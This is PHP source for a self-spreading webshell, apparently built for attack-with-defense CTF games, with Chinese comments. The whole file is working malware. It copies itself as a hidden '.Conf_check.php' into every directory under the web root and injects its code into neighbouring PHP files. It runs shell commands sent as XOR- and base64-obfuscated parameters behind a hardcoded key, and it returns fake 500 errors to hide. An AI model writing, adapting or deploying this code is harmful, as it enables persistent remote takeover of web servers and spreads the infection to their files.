<?php
$tips = 'AWD_Light_Check';
//这个是后面检查的是否感染头，如果没有，就会重写这个php
error_reporting(0);
$Serv_Num = 174;
//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。
$arr_dir = array();
//全局变量，扫到的文件夹
$files = array();
//全局变量，扫到的文件
if (!function_exists('Url_Check')) {
    function Url_Check()
    {
        $pageURL = 'http';
        if ($_SERVER["HTTPS"] == "on") {
            $pageURL .= "s";
        }
        $pageURL .= '://';
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
        return $pageURL;
    }
    function file_check($dir)
    {
        //扫描文件夹
        global $arr_dir;
        global $files;
        if (is_dir($dir)) {
            if ($handle = opendir($dir)) {
                while (($file = readdir($handle)) !== false) {
                    if ($file != '.' && $file != "..") {
                        if (is_dir($dir . "/" . $file)) {
                            $arr_dir[] = $dir;
                            $files[$file] = file_check($dir . "/" . $file);
                            //拼接文件
                        } else {
                            $arr_dir[] = $dir;
                            $files[] = $dir . "/" . $file;
                        }
                    }
                }
            }
        }
        closedir($handle);
        $arr_dir = array_unique($arr_dir);
        //去重
    }
    function xor_flag($data, $key) {
        $keyLen = strlen($key);
        $result = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $result .= chr(ord($data[$i]) ^ ord($key[$i % $keyLen]));
        }
        return $result;
    }
    function write_conf()
    {
        #每个目录创一个马
        global $Serv_Num;
        global $arr_dir;
        foreach ($arr_dir as $dir_path) {
            // echo '<br>'.$dir_path;
            $srcode = '';
            $localtext = file(__FILE__);
            for ($i = 0; $i < $Serv_Num; $i++) {
                $srcode .= $localtext[$i];
            }
            //所有文件夹都生成一个webshell
            // echo "<span style='color:#666'></span> " . $dir_path . "/.Conf_check.php" . "<br/>";
            $le = Url_Check();
            echo '<iframe id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir_path . "/.Conf_check.php") . '</iframe>';
            fputs(fopen($dir_path . "/.Conf_check.php", "w"), $srcode);
        }
        // 当前目录所有php被感染
    }
    function vul_tran()
    {
        global $Serv_Num;
        $pdir = dirname(__FILE__);

        if (is_dir($pdir)) {
            if ($dh = opendir($pdir)) {
                while (($fi = readdir($dh)) !== false) {
                    $file_Path = $pdir . '/' . $fi;

                    // 精确处理 .php 文件
                    if (is_file($file_Path) && pathinfo($file_Path, PATHINFO_EXTENSION) === 'php') {
                        $file_Path = str_replace('\\', '/', $file_Path);

                        // 输出检测 iframe
                        $le = Url_Check();
                        echo '<iframe id="check_url">' . $le . str_replace($_SERVER['DOCUMENT_ROOT'], '', $file_Path) . '</iframe>';

                        // 检查目标文件中是否已包含感染标识
                        $lines = file($file_Path);
                        $infected = false;
                        foreach ($lines as $line) {
                            if (strpos($line, 'AWD_Light_Check') !== false) {
                                $infected = true;
                                break;
                            }
                        }

                        if (!$infected) {
                            // 从自身文件中提取传播代码：<?php 后的 $Serv_Num 行
                            $self_lines = file(__FILE__);
                            $start = -1;
                            for ($i = 0; $i < count($self_lines); $i++) {
                                if (strpos($self_lines[$i], '<?php') !== false) {
                                    $start = $i + 1; // 从下一行开始截取
                                    break;
                                }
                            }

                            $scode = '';
                            if ($start !== -1) {
                                for ($i = $start; $i < $start + $Serv_Num && $i < count($self_lines); $i++) {
                                    $scode .= $self_lines[$i];
                                }
                            }

                            // 读取目标文件内容
                            $original = file_get_contents($file_Path);
                            $php_pos = strpos($original, '<?php');

                            if ($php_pos !== false) {
                                $insert_pos = $php_pos + strlen('<?php');

                                // 构造新内容（传播代码不包含 <?php）
                                $new_content = substr($original, 0, $insert_pos)
                                    . "\n" . $scode . "\n"
                                    . substr($original, $insert_pos);

                                file_put_contents($file_Path, $new_content);
                            }
                        }
                    }
                }
                closedir($dh);
            }
        }
    }
}
///////////////////////////////////////////////////////////////////////////////////
//主函数
try {
    //定义特征才启动传播模式，特征值为_
    if (isset($_GET['_'])) {
        $host = Url_Check();
        file_check($_SERVER['DOCUMENT_ROOT']);
        //全局扫描
        write_conf();
        //写入单文件
        vul_tran();
        //感染当前目录
    } elseif (isset($_GET['check']) && isset($_GET['sign'])) {
        #客户端数字签名校验
        $Check_key = '7a8e94500838309f3877a9d795bd07c0';
        $Check_api = $_GET['check'];
        $csign = $_GET['sign'];
        if ($Check_key === $csign) {
            $flags = base64_decode($Check_api);
            $flag = xor_flag($flags,$Check_key);
            $echo1 = base64_encode(xor_flag(rawurlencode(`{$flag}`),$Check_key));
            $echo2 = $echo1."BsjJSBiO==";
            $final = str_replace("=", ":kcehc_revres", $echo2);
            echo "ffllaagg";
            echo $final;
        } else {
            header('HTTP/1.1 500 Internal Server Error');
        }
    } else {
        header('HTTP/1.1 500 Internal Server Error');
    }
} catch (Exception $e2) {
}
?>